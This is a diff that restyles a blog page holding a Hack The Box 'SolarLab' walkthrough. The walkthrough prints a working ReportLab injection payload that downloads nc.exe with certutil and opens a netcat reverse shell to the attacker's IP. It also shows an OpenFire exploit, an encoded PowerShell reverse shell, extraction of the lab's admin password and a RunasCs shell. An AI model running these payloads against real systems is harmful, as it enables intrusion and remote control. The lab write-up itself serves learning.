@@ -1,1 +1,411 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Blake Byte</u></strong></span></p><p>Names found on the webpage</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2554/1351;" src="../img/posts/2024-05-20-SolarLab(HTB)/01-9bdeb61640.png" width="2554" height="1351"></figure><p><code>Alexander Knight</code><br><code>Caudia Springer</code><br><code>Blake Byte</code></p><p>&nbsp;</p><p>SMB anonymous login is available and we can access a documents folder with 4 files available.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:870/219;" src="../img/posts/2024-05-20-SolarLab(HTB)/02-ee0881f9f9.png" width="870" height="219"></figure><p><code>Training-Request-Form.docx</code><br><code>Travel-Request-Sample.docx</code><br><code>details-file.xlsx</code><br><code>old_leave_request_form.docx</code><br>&nbsp;</p><p>&nbsp;</p><p>Moved the documents to my windows machine to make things easier and we have some interesting info</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1632/501;" src="../img/posts/2024-05-20-SolarLab(HTB)/03-a761b510c6.png" width="1632" height="501"></figure><p>&nbsp;</p><p>Passwords found</p><p><code>al;ksdhfewoiuh</code><br><code>dkjafblkjadsfgl</code><br><code>d398sadsknr390</code><br><code>ThisCanB3typedeasily1@</code><br><code>danenacia9234n</code><br><code>dadsfawe9dafkn</code></p><p>Users found</p><p><code>Alexander.knight@gmail.com</code><br><code>KAlexander</code><br><code>Alexander.knight@gmail.com</code><br><code>blake.byte</code><br><code>AlexanderK</code><br><code>ClaudiaS</code><br><br>&nbsp;</p><p>Couldnt find anything interesting so i looked back at nmap and port 6791 is a web page. I tried accessing it earlier but it didnt load. In nmap it shows the subdomain name. I add it to our /etc/hosts and we have a login page.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1697/646;" src="../img/posts/2024-05-20-SolarLab(HTB)/04-d7adbf8d45.png" width="1697" height="646"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can enumerate users on this page as it discloses if the username is not found.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:708/505;" src="../img/posts/2024-05-20-SolarLab(HTB)/05-cb5808b8bf.png" width="708" height="505"></figure><p>&nbsp;</p><p>&nbsp;</p><p>The correct username is <code>AlexanderK</code>, however none of the passwords we found work for this. The file with all the usernames and passwords includes security questions. Currently running gobuster to see if theres a way to reset passwords and possibly supply these security question answers.</p><p>&nbsp;</p><p>I doubled checked the list and I didnt enter one username. <code>ClaudiaS</code>, which comes back to a vaild user as well. Passwords found also dont work though.</p><p>&nbsp;</p><p>Got some help from a user on discord and he told me to “Guess” for another username. Looking at the list of users I tried BlakeB and it worked.</p><p>&nbsp;</p><p>&nbsp;</p><p>We can login with BlakeB:<code>ThisCanB3typedeasily1@</code></p><p><code>ThisCanB3typedeasily1@</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:981/705;" src="../img/posts/2024-05-20-SolarLab(HTB)/06-8161a359c3.png" width="981" height="705"></figure><p>&nbsp;</p><p>Each of these options allow us to submit a request with an image file</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:819/569;" src="../img/posts/2024-05-20-SolarLab(HTB)/07-7a0dbb805f.png" width="819" height="569"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I created a pdf and grabbed the request in burp and saw its using reportlab pdf to create &nbsp;the pdfs. Reportlab seems to have some exploits but they are html document exploits.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1757/431;" src="../img/posts/2024-05-20-SolarLab(HTB)/08-d066071d09.png" width="1757" height="431"></figure><p>&nbsp;</p><p>This seems to be the exploit we want to use</p><p>https://github.com/c53elyas/CVE-2023-33733</p><p>&nbsp;</p><p>After a ton of testing I was trying the exploit in the wrong place that had a character limit. Doing this under the “title section” works and I get a curl request. With this I have RCE and should be able to get a shell.</p><figure class="image"><img style="aspect-ratio:2267/894;" src="../img/posts/2024-05-20-SolarLab(HTB)/09-b10d6d3f23.png" width="2267" height="894"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>First I run the above command to get nc.exe from our machine, then I run nc.exe to get a shell</p><p><code>&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('certutil -urlcache -f </code><a href="http://10.10.14.30/nc.exe"><code>http://10.10.14.30/nc.exe</code></a><code> nc.exe') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exploit</code><br><code>&lt;/font&gt;&lt;/para&gt;</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:569/124;" src="../img/posts/2024-05-20-SolarLab(HTB)/10-990ff6ad0d.png" width="569" height="124"></figure><p>&nbsp;</p><p><code>&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('nc.exe -e cmd 10.10.14.30 443') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exploit</code><br><code>&lt;/font&gt;&lt;/para&gt;</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:579/237;" src="../img/posts/2024-05-20-SolarLab(HTB)/11-61e93457e1.png" width="579" height="237"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as OpenFire</u></strong></span></p><p>We have another user called OpenFire, may need to compromise this account.</p><p>&nbsp;</p><p>OpenFire has some known exploits.</p><p>&nbsp;</p><p>Looking at open ports we have openfire open on 9090</p><p>.\chisel.exe <code>client 10.10.14.30:8000 R:9090:localhost:9090</code></p><p>&nbsp;</p><p>After port forwarding we can now access the openfire portal</p><p>&nbsp;</p><p>Version 4.7.4 has a known RCE exploit</p><figure class="image"><img style="aspect-ratio:1642/777;" src="../img/posts/2024-05-20-SolarLab(HTB)/12-eb29e82929.png" width="1642" height="777"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Using this public script released in 2023 we can create an account on the page and sign in</p><p><a href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:980/343;" src="../img/posts/2024-05-20-SolarLab(HTB)/13-2591559f7f.png" width="980" height="343"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can now login with the username/password above.</p><p>&nbsp;</p><p>I then upload a plugin following the CVE steps.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:707/222;" src="../img/posts/2024-05-20-SolarLab(HTB)/14-6c77e7e03d.png" width="707" height="222"></figure><figure class="image"><img style="aspect-ratio:2199/352;" src="../img/posts/2024-05-20-SolarLab(HTB)/15-98f33143ed.png" width="2199" height="352"></figure><p>&nbsp;</p><p>Once we log into the management portal we can execute commands. I tried using nc.exe but it wouldnt work. Used a powershell rev shell with</p><p><code>cat shell.ps1 | iconv -t utf-16le | base64 -w 0</code></p><p>then I copy the output and paste it into the execute command option</p><p><code>PowerShell.exe -Exec ByPass -Nol -Enc &lt;base64 payload&gt;</code></p><figure class="image"><img style="aspect-ratio:1500/249;" src="../img/posts/2024-05-20-SolarLab(HTB)/16-c63dbe8372.png" width="1500" height="249"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:479/150;" src="../img/posts/2024-05-20-SolarLab(HTB)/17-27065111de.png" width="479" height="150"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Administrator</u></strong></span></p><p>&nbsp;</p><p>Looking at my privileges and the system info of the machine there are not any known exploits so I knew we had to find credentials for Admin.</p><p>This was found at C:\Program Files\Openfire\embedded-db containing SQL information.</p><figure class="image"><img style="aspect-ratio:1259/490;" src="../img/posts/2024-05-20-SolarLab(HTB)/18-6c479fb74e.png" width="1259" height="490"></figure><p>INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')</p><p>&nbsp;</p><p>Looking at this post <a href="https://hashcat.net/forum/thread-2399.html">https://hashcat.net/forum/thread-2399.html</a> we can decrypt the password with the key. The key is in the same file.</p><p>The link above shows how we can decrypt the string using java, I had chatgpt create a script in python as the java one didnt work. I am sure there are public ones available but this was faster.</p><p><code>Hash = becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></p><p><code>Key = hGXiFzsKaAeYLjn</code></p><p>&nbsp;</p><p>Admin password ThisPasswordShouldDo!@</p><figure class="image"><img style="aspect-ratio:1236/67;" src="../img/posts/2024-05-20-SolarLab(HTB)/19-06baff9228.png" width="1236" height="67"></figure><p>&nbsp;</p><p>Confirming the admin password works(note the back slash is just for escaping)</p><figure class="image"><img style="aspect-ratio:1201/213;" src="../img/posts/2024-05-20-SolarLab(HTB)/20-58ced11835.png" width="1201" height="213"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I spent quite a while trying to get a shell on the machine with the login and couldnt get it. Evil-winrm port wasnt open so we didnt have easy access. I forgot about the program RunAsCs, this makes it really easy. Downloaded it and moved it to the machine and ran it and we are Admin.<br>https://github.com/antonioCoco/RunasCs</p><p>&nbsp;</p><p>.\runascs.exe Administrator ThisPasswordShouldDo!@ cmd -r 10.10.14.30:443</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:579/233;" src="../img/posts/2024-05-20-SolarLab(HTB)/21-9f0a839695.png" width="579" height="233"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></body></html>
+<html><head><meta charset="utf-8">
+    <title>HTB: SolarLab | HackWithJordan</title><style>
+        :root {
+            --bg: #0b0e14;
+            --accent: #5eead4;
+            --violet: #7c8cf8;
+            --text: #e8edf2;
+            --muted: #8b97a6;
+            --surface: rgba(255, 255, 255, .04);
+            --border: rgba(255, 255, 255, .09);
+            --accent-dim: rgba(94, 234, 212, .14);
+            --border-hover: rgba(94, 234, 212, .45);
+            --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --mono: 'Cascadia Code', 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            line-height: 1.65;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        ::selection {
+            background: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        #bg-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(110px);
+            opacity: .5;
+            z-index: 0;
+            pointer-events: none;
+            will-change: transform;
+        }
+
+        .blob-1 {
+            width: 55vw;
+            height: 55vw;
+            top: -20vw;
+            left: -15vw;
+            background: radial-gradient(circle, rgba(94, 234, 212, .16), transparent 70%);
+            animation: drift1 26s ease-in-out infinite alternate;
+        }
+
+        .blob-2 {
+            width: 48vw;
+            height: 48vw;
+            bottom: -18vw;
+            right: -12vw;
+            background: radial-gradient(circle, rgba(124, 140, 248, .16), transparent 70%);
+            animation: drift2 32s ease-in-out infinite alternate;
+        }
+
+        .blob-3 {
+            width: 34vw;
+            height: 34vw;
+            top: 40%;
+            left: 55%;
+            background: radial-gradient(circle, rgba(94, 234, 212, .10), transparent 70%);
+            animation: drift3 22s ease-in-out infinite alternate;
+        }
+
+        @keyframes drift1 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(6vw, 4vw) scale(1.15); }
+        }
+
+        @keyframes drift2 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-5vw, -6vw) scale(1.1); }
+        }
+
+        @keyframes drift3 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-4vw, 5vw) scale(.9); }
+        }
+
+        article.post {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 96px 28px 80px;
+        }
+
+        .post-header {
+            border-bottom: 2px solid var(--violet);
+            padding-bottom: 18px;
+            margin-bottom: 36px;
+        }
+
+        .post-header h1 {
+            font-size: 2.1rem;
+            line-height: 1.2;
+            color: var(--violet);
+            font-weight: 700;
+            letter-spacing: -0.01em;
+        }
+
+        .post-header .post-meta {
+            color: var(--muted);
+            font-size: 0.95rem;
+            margin-top: 8px;
+            font-family: var(--mono);
+            letter-spacing: 0.3px;
+        }
+
+        .post h1 {
+            color: var(--violet);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 44px 0 14px;
+        }
+
+        .post h2 {
+            color: var(--violet);
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin: 36px 0 12px;
+        }
+
+        .post h3 {
+            color: var(--violet);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 28px 0 10px;
+        }
+
+        .post p {
+            margin: 15px 0;
+        }
+
+        .post a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .post a:hover {
+            text-decoration: underline;
+        }
+
+        .post img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .post figure {
+            margin: 20px 0;
+        }
+
+        .post pre.terminal {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: var(--mono);
+            font-size: 0.88rem;
+            line-height: 1.55;
+            margin: 18px 0;
+            color: var(--text);
+        }
+
+        .post code {
+            font-family: var(--mono);
+            font-size: 0.9em;
+            background: var(--surface);
+            padding: 2px 6px;
+            border-radius: 4px;
+            overflow-wrap: anywhere;
+        }
+
+        .post pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .post ul,
+        .post ol {
+            margin: 15px 0 15px 24px;
+        }
+
+        .post li {
+            margin: 6px 0;
+        }
+
+        .post hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 32px 0;
+        }
+
+        .post table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 18px 0;
+            font-size: 0.95rem;
+        }
+
+        .post th,
+        .post td {
+            border: 1px solid var(--border);
+            padding: 8px 12px;
+            text-align: left;
+        }
+
+        .post th {
+            background: var(--surface);
+            color: var(--violet);
+        }
+
+        @media (max-width: 640px) {
+            article.post {
+                padding: 72px 20px 60px;
+            }
+
+            .post-header h1 {
+                font-size: 1.7rem;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .blob {
+                animation: none;
+            }
+        }
+    
+        .home-btn {
+            position: fixed;
+            top: 24px;
+            right: 28px;
+            z-index: 5;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            color: var(--muted);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 7px 14px;
+            text-decoration: none;
+            transition: color 0.2s ease, border-color 0.2s ease;
+        }
+        .home-btn:hover {
+            color: var(--accent);
+            border-color: var(--border-hover);
+        }
+</style>
+</head><body>
+    <a class="home-btn" href="../" title="Back to home">~$ cd ~</a>
+    <canvas id="bg-canvas"></canvas>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+
+    <article class="post">
+        <header class="post-header">
+            <h1>HTB: SolarLab</h1>
+            <div class="post-meta">May 20, 2024 &bull; HTB</div>
+        </header>
+
+<p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Blake Byte</u></strong></span></p><p>Names found on the webpage</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2554/1351;" src="../img/posts/2024-05-20-SolarLab(HTB)/01-9bdeb61640.png" width="2554" height="1351"></figure><p><code>Alexander Knight</code><br><code>Caudia Springer</code><br><code>Blake Byte</code></p><p>&nbsp;</p><p>SMB anonymous login is available and we can access a documents folder with 4 files available.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:870/219;" src="../img/posts/2024-05-20-SolarLab(HTB)/02-ee0881f9f9.png" width="870" height="219"></figure><p><code>Training-Request-Form.docx</code><br><code>Travel-Request-Sample.docx</code><br><code>details-file.xlsx</code><br><code>old_leave_request_form.docx</code><br>&nbsp;</p><p>&nbsp;</p><p>Moved the documents to my windows machine to make things easier and we have some interesting info</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1632/501;" src="../img/posts/2024-05-20-SolarLab(HTB)/03-a761b510c6.png" width="1632" height="501"></figure><p>&nbsp;</p><p>Passwords found</p><p><code>al;ksdhfewoiuh</code><br><code>dkjafblkjadsfgl</code><br><code>d398sadsknr390</code><br><code>ThisCanB3typedeasily1@</code><br><code>danenacia9234n</code><br><code>dadsfawe9dafkn</code></p><p>Users found</p><p><code>Alexander.knight@gmail.com</code><br><code>KAlexander</code><br><code>Alexander.knight@gmail.com</code><br><code>blake.byte</code><br><code>AlexanderK</code><br><code>ClaudiaS</code><br><br>&nbsp;</p><p>Couldnt find anything interesting so i looked back at nmap and port 6791 is a web page. I tried accessing it earlier but it didnt load. In nmap it shows the subdomain name. I add it to our /etc/hosts and we have a login page.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1697/646;" src="../img/posts/2024-05-20-SolarLab(HTB)/04-d7adbf8d45.png" width="1697" height="646"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can enumerate users on this page as it discloses if the username is not found.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:708/505;" src="../img/posts/2024-05-20-SolarLab(HTB)/05-cb5808b8bf.png" width="708" height="505"></figure><p>&nbsp;</p><p>&nbsp;</p><p>The correct username is <code>AlexanderK</code>, however none of the passwords we found work for this. The file with all the usernames and passwords includes security questions. Currently running gobuster to see if theres a way to reset passwords and possibly supply these security question answers.</p><p>&nbsp;</p><p>I doubled checked the list and I didnt enter one username. <code>ClaudiaS</code>, which comes back to a vaild user as well. Passwords found also dont work though.</p><p>&nbsp;</p><p>Got some help from a user on discord and he told me to “Guess” for another username. Looking at the list of users I tried BlakeB and it worked.</p><p>&nbsp;</p><p>&nbsp;</p><p>We can login with BlakeB:<code>ThisCanB3typedeasily1@</code></p><p><code>ThisCanB3typedeasily1@</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:981/705;" src="../img/posts/2024-05-20-SolarLab(HTB)/06-8161a359c3.png" width="981" height="705"></figure><p>&nbsp;</p><p>Each of these options allow us to submit a request with an image file</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:819/569;" src="../img/posts/2024-05-20-SolarLab(HTB)/07-7a0dbb805f.png" width="819" height="569"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I created a pdf and grabbed the request in burp and saw its using reportlab pdf to create &nbsp;the pdfs. Reportlab seems to have some exploits but they are html document exploits.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1757/431;" src="../img/posts/2024-05-20-SolarLab(HTB)/08-d066071d09.png" width="1757" height="431"></figure><p>&nbsp;</p><p>This seems to be the exploit we want to use</p><p>https://github.com/c53elyas/CVE-2023-33733</p><p>&nbsp;</p><p>After a ton of testing I was trying the exploit in the wrong place that had a character limit. Doing this under the “title section” works and I get a curl request. With this I have RCE and should be able to get a shell.</p><figure class="image"><img style="aspect-ratio:2267/894;" src="../img/posts/2024-05-20-SolarLab(HTB)/09-b10d6d3f23.png" width="2267" height="894"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>First I run the above command to get nc.exe from our machine, then I run nc.exe to get a shell</p><p><code>&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('certutil -urlcache -f </code><a href="http://10.10.14.30/nc.exe"><code>http://10.10.14.30/nc.exe</code></a><code> nc.exe') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exploit</code><br><code>&lt;/font&gt;&lt;/para&gt;</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:569/124;" src="../img/posts/2024-05-20-SolarLab(HTB)/10-990ff6ad0d.png" width="569" height="124"></figure><p>&nbsp;</p><p><code>&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('nc.exe -e cmd 10.10.14.30 443') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exploit</code><br><code>&lt;/font&gt;&lt;/para&gt;</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:579/237;" src="../img/posts/2024-05-20-SolarLab(HTB)/11-61e93457e1.png" width="579" height="237"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as OpenFire</u></strong></span></p><p>We have another user called OpenFire, may need to compromise this account.</p><p>&nbsp;</p><p>OpenFire has some known exploits.</p><p>&nbsp;</p><p>Looking at open ports we have openfire open on 9090</p><p>.\chisel.exe <code>client 10.10.14.30:8000 R:9090:localhost:9090</code></p><p>&nbsp;</p><p>After port forwarding we can now access the openfire portal</p><p>&nbsp;</p><p>Version 4.7.4 has a known RCE exploit</p><figure class="image"><img style="aspect-ratio:1642/777;" src="../img/posts/2024-05-20-SolarLab(HTB)/12-eb29e82929.png" width="1642" height="777"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Using this public script released in 2023 we can create an account on the page and sign in</p><p><a href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:980/343;" src="../img/posts/2024-05-20-SolarLab(HTB)/13-2591559f7f.png" width="980" height="343"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can now login with the username/password above.</p><p>&nbsp;</p><p>I then upload a plugin following the CVE steps.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:707/222;" src="../img/posts/2024-05-20-SolarLab(HTB)/14-6c77e7e03d.png" width="707" height="222"></figure><figure class="image"><img style="aspect-ratio:2199/352;" src="../img/posts/2024-05-20-SolarLab(HTB)/15-98f33143ed.png" width="2199" height="352"></figure><p>&nbsp;</p><p>Once we log into the management portal we can execute commands. I tried using nc.exe but it wouldnt work. Used a powershell rev shell with</p><p><code>cat shell.ps1 | iconv -t utf-16le | base64 -w 0</code></p><p>then I copy the output and paste it into the execute command option</p><p><code>PowerShell.exe -Exec ByPass -Nol -Enc &lt;base64 payload&gt;</code></p><figure class="image"><img style="aspect-ratio:1500/249;" src="../img/posts/2024-05-20-SolarLab(HTB)/16-c63dbe8372.png" width="1500" height="249"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:479/150;" src="../img/posts/2024-05-20-SolarLab(HTB)/17-27065111de.png" width="479" height="150"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Administrator</u></strong></span></p><p>&nbsp;</p><p>Looking at my privileges and the system info of the machine there are not any known exploits so I knew we had to find credentials for Admin.</p><p>This was found at C:\Program Files\Openfire\embedded-db containing SQL information.</p><figure class="image"><img style="aspect-ratio:1259/490;" src="../img/posts/2024-05-20-SolarLab(HTB)/18-6c479fb74e.png" width="1259" height="490"></figure><p>INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')</p><p>&nbsp;</p><p>Looking at this post <a href="https://hashcat.net/forum/thread-2399.html">https://hashcat.net/forum/thread-2399.html</a> we can decrypt the password with the key. The key is in the same file.</p><p>The link above shows how we can decrypt the string using java, I had chatgpt create a script in python as the java one didnt work. I am sure there are public ones available but this was faster.</p><p><code>Hash = becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></p><p><code>Key = hGXiFzsKaAeYLjn</code></p><p>&nbsp;</p><p>Admin password ThisPasswordShouldDo!@</p><figure class="image"><img style="aspect-ratio:1236/67;" src="../img/posts/2024-05-20-SolarLab(HTB)/19-06baff9228.png" width="1236" height="67"></figure><p>&nbsp;</p><p>Confirming the admin password works(note the back slash is just for escaping)</p><figure class="image"><img style="aspect-ratio:1201/213;" src="../img/posts/2024-05-20-SolarLab(HTB)/20-58ced11835.png" width="1201" height="213"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I spent quite a while trying to get a shell on the machine with the login and couldnt get it. Evil-winrm port wasnt open so we didnt have easy access. I forgot about the program RunAsCs, this makes it really easy. Downloaded it and moved it to the machine and ran it and we are Admin.<br>https://github.com/antonioCoco/RunasCs</p><p>&nbsp;</p><p>.\runascs.exe Administrator ThisPasswordShouldDo!@ cmd -r 10.10.14.30:443</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:579/233;" src="../img/posts/2024-05-20-SolarLab(HTB)/21-9f0a839695.png" width="579" height="233"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    </article>
+
+<script>
+        // ---------- Particle background ----------
+        (function () {
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+            const mouse = { x: null, y: null };
+            let particles = [];
+            let w = 0, h = 0;
+
+            function resize() {
+                const dpr = Math.min(window.devicePixelRatio || 1, 2);
+                w = window.innerWidth;
+                h = window.innerHeight;
+                canvas.width = w * dpr;
+                canvas.height = h * dpr;
+                canvas.style.width = w + 'px';
+                canvas.style.height = h + 'px';
+                ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+                seed();
+            }
+
+            function seed() {
+                const count = Math.min(90, Math.floor((w * h) / 16000));
+                particles = [];
+                for (let i = 0; i < count; i++) {
+                    particles.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        vx: (Math.random() - 0.5) * 0.35,
+                        vy: (Math.random() - 0.5) * 0.35,
+                        r: Math.random() * 1.5 + 0.7
+                    });
+                }
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+
+                for (const p of particles) {
+                    p.x += p.vx;
+                    p.y += p.vy;
+
+                    if (p.x < -20) p.x = w + 20;
+                    if (p.x > w + 20) p.x = -20;
+                    if (p.y < -20) p.y = h + 20;
+                    if (p.y > h + 20) p.y = -20;
+
+                    if (mouse.x !== null) {
+                        const dx = p.x - mouse.x;
+                        const dy = p.y - mouse.y;
+                        const d = Math.hypot(dx, dy);
+                        if (d < 120 && d > 0.001) {
+                            const f = (1 - d / 120) * 0.5;
+                            p.x += (dx / d) * f;
+                            p.y += (dy / d) * f;
+                        }
+                    }
+                }
+
+                for (let i = 0; i < particles.length; i++) {
+                    const a = particles[i];
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const b = particles[j];
+                        const d = Math.hypot(a.x - b.x, a.y - b.y);
+                        if (d < 110) {
+                            ctx.strokeStyle = 'rgba(94, 234, 212, ' + (0.14 * (1 - d / 110)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(b.x, b.y);
+                            ctx.stroke();
+                        }
+                    }
+                    if (mouse.x !== null) {
+                        const d = Math.hypot(a.x - mouse.x, a.y - mouse.y);
+                        if (d < 140) {
+                            ctx.strokeStyle = 'rgba(124, 140, 248, ' + (0.18 * (1 - d / 140)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
